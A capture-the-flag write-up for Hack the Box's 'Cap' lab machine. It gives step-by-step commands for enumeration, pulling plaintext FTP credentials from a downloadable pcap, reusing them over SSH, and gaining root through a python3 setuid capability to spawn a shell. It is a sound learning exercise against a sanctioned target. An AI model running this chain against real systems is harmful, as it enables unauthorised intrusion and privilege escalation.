# Cap

**A writeup for Hack the Box's 'Cap' machine:**

https://www.hackthebox.com/machines/cap

**See also my video walkthrough of this machine:**

https://www.youtube.com/watch?v=jh7hrJC3XYY

---
## Getting Started:

Before starting, please ensure you are connected to the machine by pinging it with the ping command:

**ping 10.10.10.245  (or other provided machine adress)**

If this is working and you are seeing something like this:

<img width="555" height="176" alt="image" src="https://github.com/user-attachments/assets/e39c6673-74a2-468d-9fac-4c5cd42f9099" />

That means you are connected correctly!

&nbsp;

Additionally, please ensure you have the following tools installed:
- **nmap**
- **tcpdump**
- **ffuf**
- **linpeas.sh, clonable from:
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh**

---
## Finding the user key:

In this first half, we will discover how to break into this machine and find its user key.

### Step 1: Basic Enumeration
---

As with any HTB puzzle, our first order of buisness is to figure out what this network has to offer. We will determine this using nmap:

**nmap -sC -sV 10.10.10.245**

The -sC and -sV commands tell nmap to run its standard script, and to relay back to us service and version for each port, if detected.


We will get something like this back:

<img width="678" height="320" alt="image" src="https://github.com/user-attachments/assets/1d6156f8-60b9-47cc-8d7d-ccc2f11cb671" />

&nbsp;

This tells us that our machine has:
- An open FTP port on port 21
- An open SSH port on port 22
- An open HTTP port on port 80

After (unsuccessfully) trying the FTP port for an anonymous login:

**ftp 10.10.10.245 (as 21 is the default FTP port)**

We move to investigating the HTTP.

### Step 2: HTTP Vulnerability Finding
---

Upon opening the HTTP port in our browser

**http://10.10.10.245:80**

We are met with a security dashboard interface:

<img width="1364" height="624" alt="image" src="https://github.com/user-attachments/assets/a4032e52-323c-49a6-8585-96501b56dce8" />


After some digging around, we stumble across the "Security Snapshot" page, which contains some stats and a "download" button that provides us with a .pcap file.

<img width="1353" height="627" alt="image" src="https://github.com/user-attachments/assets/2452db58-bac0-485c-b3d2-6be14556015a" />

After playing with it for awhile, we notice that the url for this page changes very predictably: It is always **10.10.10.245/data/** and then a usually single digit number.
Because of this, we will use ffuf to dtermine all the open data/ pages. First however, we must have a wordlist for ffuf to pull from. To do this, we will use
our sequence (seq) command:

**seq 0 100 > 0_100.txt**

This will make a .txt file of numbers 0-100. Use this as your worldlist for ffuf:

**ffuf -u http://10.10.10.245/data/FUZZ -w 0_100.txt | grep 200**

We get this back:

<img width="776" height="158" alt="image" src="https://github.com/user-attachments/assets/0cd28a19-5c55-4be2-8eff-a12ef6d1c59c" />

This means that there are a few possible /data/ screens (these may vary):
- 3
- 1
- 4
- 0
- 5
- 6
- 2

After clicking the "Security Snapshot" tab a few times, we realize that we don't ever se the /data/0 tab, so we navagate there, and download the .pcap.

### Step 3: Breaking into the SSH
---

Now that we have our 0.pcap, we will read its contents using tcpdump:

**sudo tcpdump -r 0.pcap**

It prints a lot of data, but around the middle of the file we are met with this:

<img width="1270" height="138" alt="image" src="https://github.com/user-attachments/assets/331ab51a-b408-4543-952a-145e237ff987" />

From here, we can see that a user "nathan" logged in with password "Buck3tH4TF0RM3!" successfully logged into FTP to verify
this, we will attempt to log into FTP using these credentials

**ftp 10.10.10.245**

Input credentials and:

<img width="308" height="173" alt="image" src="https://github.com/user-attachments/assets/d9be221e-f4b8-4511-9211-9a9bf7c4dce6" />

It works! We could use this to get SSH access, however we will first try simply logging into SSH with these credentials:

**ssh nathan@10.10.10.245 (port specification not needed as SSH is on port 22)**

Input password and:

<img width="460" height="33" alt="image" src="https://github.com/user-attachments/assets/cd92a6fa-abfc-4d20-b0c8-272a924cebc4" />

It works too! A quick:

**ls**

Shows us that user.txt is in our current working directory. Read it with cat:

**cat user.txt**

---

## Finding the root key:

### Step 1: Importing linpeas.sh
---

Now that we are into the SSH, we will have a look around. Looking in /home we see that nathan is the only user:

**cd /home**

**ls**

Next, we will check if nathan has access to sudo:

**sudo -l**

After inputting nathan's password, we can see that this account does not have root access.
So, we will import linpeas (linux priveledge escalation awesome script) to /tmp and run it to
hopefully discover some useful vulnerabilities. On your **local** shell in the directory with 
your linpeas.sh file,

**scp linpeas.sh nathan@10.10.10.245/tmp**

After putting in nathan's password, navigate to the /tmp folder on your SSH shell where you're logged in as nathan and run linpeas:

**cd /tmp**

**chmod +x linpeas.sh**

**./linpeas.sh**

After it runs, we find a large vulnerability in this report here:

<img width="482" height="47" alt="image" src="https://github.com/user-attachments/assets/b0fd2720-ac94-4d3d-8781-039ff30896b1" />

This means that python3.8 has the ability to change its user id or permission level. Because of this line, we now know that
we can write a super tiny python script to set our user id to 0 (root) then to spawn a shell. We will do this using the python3
command:

**python3**

**>>> import os**

**>>> os.setuid(0)**

**>>> os.system("/bin/bash")**

We now see our spawned shell:

<img width="231" height="77" alt="image" src="https://github.com/user-attachments/assets/564aa359-2edd-4d39-a1cf-bf68e2ccc14b" />

This means that we now have a working root shell! To verify:

**sudo -l**

And we see:

<img width="674" height="155" alt="image" src="https://github.com/user-attachments/assets/e50c059b-a34c-413b-a9f3-c77e49ade8d0" />

So, finally, we will navigate to /root and collect our root flag:

**cd /root**

**ls**

<img width="128" height="18" alt="image" src="https://github.com/user-attachments/assets/66f6b4ae-2974-4f52-9c4a-da38f55f6590" />

There it is! Read with cat:

**cat root.txt**

And that is all for this machine. Thanks for reading!

---

## What I learned:

In completing this HTB machine, I gained a deeper understanding of the core methodology behind penetration testing, 
an invaluable skill not only for offensive security roles but also for software development. Learning how vulnerabilities 
are identified and exploited has helped me better understand security and networking systems at a lower level, enabling me to approach 
software design with a stronger security-first mindset.

This challenge also gave me practical experience with the inner workings of SSH and FTP, 
both of which are fundamental to modern networking. Additionally, it allowed me to become more proficient with 
lesser-used tools and features of my operating system, Manjaro Linux, reinforcing the importance of fluency in the underlying 
environment when performing security assessments.
